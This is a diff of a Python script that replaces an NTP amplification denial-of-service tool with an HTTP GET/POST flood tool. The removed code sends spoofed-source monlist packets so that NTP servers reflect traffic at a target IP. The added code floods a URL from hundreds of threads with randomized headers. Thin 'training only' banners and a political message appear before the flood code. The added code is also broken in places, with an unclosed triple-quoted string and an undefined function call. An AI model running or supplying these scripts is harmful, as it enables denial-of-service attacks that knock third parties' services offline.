@@ -1,83 +1,166 @@
 #!/usr/bin/env python
-from scapy.all import *
-import ntp
+import os
 import sys
-import threading
 import time
-#usage drako dos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
-#HANYA UNTUK DIGUNAKAN DI JARINGAN ANDA SENDIRI
+import requests
+import threading
+import random
+import re
+import argparse
 
+time.sleep(3)
+os.system("clear")
+print("\033[32mFOR TRAINING PURPOSES ONLY")
 
-#packet sender
-def deny():
+time.sleep(3)
+os.system("clear")
+print("\033[37mDO NOT USE TO ATTACK OFFICIAL SITES")
 
-    
-    global ntplist
-    global currentserver
-    global data
-    global target
+time.sleep(3)
+os.system("clear")
+print("\033[38;5;220mIF USED TO HELP PALESTINE, READ BISMILLAH")
 
-ntpserver = ntplist["currentserver"] #Get new server
-currentserver = currentserver + 1 #Increment for next
-packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
-send(packet,loop=1) #SEND IT
-
-#So I dont have to have the same stuff twice
-def printhelp():
-    print ("NTP Amplification DOS Attack")
-    print ("By Kaff")
-    print ("Usage ntpdos.py [ip] [ntpserver list] [number of threads]")
-    print ("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
-    print ("NTP serverlist file should contain one IP per line")
-    print ("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
-    exit(0)
-
-if len(sys.argv) < 4:
-    printhelp()
-#Fetch Args
-target = sys.argv[1]
-
-#Help out idiots
-if target in ("help","-h","h","?","--h","--help","/?"):
-    printhelp()
-
-ntpserverfile = sys.argv[2]
-numberthreads = int(sys.argv[3])
-#System for accepting bulk input
-ntplist = []
-currentserver = 0
-with open(ntpserverfile) as f:
-    ntplist = f.readlines()
-
-    
+time.sleep(3)
+os.system("clear")
+print("""
+\033[38;5;220m
 
 
 
-#Make sure we dont out of bounds
-if numberthreads > int(len(ntplist)):
-    print ("Attack Aborted: More threads than servers")
-    print ("Next time dont create more threads than servers")
-exit(0)
 
-#Magic Packet aka NTP v2 Monlist Packet
-data = "\x17\x00\x03\x2a" + "\x00" * 4
+host=''
+headers_useragents=[]
+request_counter=0
+printedMsgs = []
 
-#Hold our threads
-threads = []
-print ("Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
-print ("Use CTRL+C to stop attack")
+def printMsg(msg):
+	if msg not in printedMsgs:
+		print ("\n"+msg + " after %i requests" % request_counter)
+		printedMsgs.append(msg)
 
-#Thread spawner
-for n in range(numberthreads):
-    thread = threading.Thread(target=deny)
-    thread.daemon = True
-    thread.start()
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+	
+def randomString(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-    threads.append(thread)
+def initHeaders():
+	useragent_list()
+	global headers_useragents, additionalHeaders
+	headers = {
+				'User-Agent': random.choice(headers_useragents),
+				'Cache-Control': 'no-cache',
+				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+				'Keep-Alive': str(random.randint(110,120)),
+				'Connection': 'keep-alive'
+				}
 
-#In progress!
-print ("Sending...")
+	if additionalHeaders:
+		for header in additionalHeaders:
+			headers.update({header.split(":")[0]:header.split(":")[1]})
+	return headers
 
-#Keep alive so ctrl+c still kills all them threads
-while True:
-    time.sleep(1)
+def handleStatusCodes(status_code):
+	global request_counter
+	sys.stdout.write("\r%i requests has been sent" % request_counter)
+	sys.stdout.flush()
+	if status_code == 429:
+			printMsg("You have been throttled")
+	if status_code == 500:
+		printedMsg("Status code 500 received")
+
+def sendGET(url):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		request = requests.get(url, headers=headers)
+		# print 'her'
+		handleStatusCodes(request.status_code)
+	except:
+		pass
+
+def sendPOST(url, payload):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		if payload:
+			request = requests.post(url, data=payload, headers=headers)
+		else:
+			request = requests.post(url, headers=headers)
+		handleStatusCodes(request.status_code)
+	except:
+		pass
+
+class SendGETThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url
+				sendGET(url)
+		except:
+			pass
+
+class SendPOSTThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url, payload
+				sendPOST(url, payload)
+		except:
+			pass
+
+
+# TODO:
+# check if the site stop responding and alert
+
+def main(argv):
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
+	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
+	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
+	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
+	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
+	args = parser.parse_args()
+
+	global url, payload, additionalHeaders
+	additionalHeaders = args.ah
+	payload = args.d
+
+	if args.g:
+		url = args.g
+		for i in range(args.t):
+			t = SendGETThread()
+			t.start()
+
+	if args.p:
+		url = args.p
+		for i in range(args.t):
+			t = SendPOSTThread()
+			t.start()
+	
+	if len(sys.argv)==1:
+		parser.print_help()
+		exit()
+	
+if __name__ == "__main__":
+   main(sys.argv[1:])
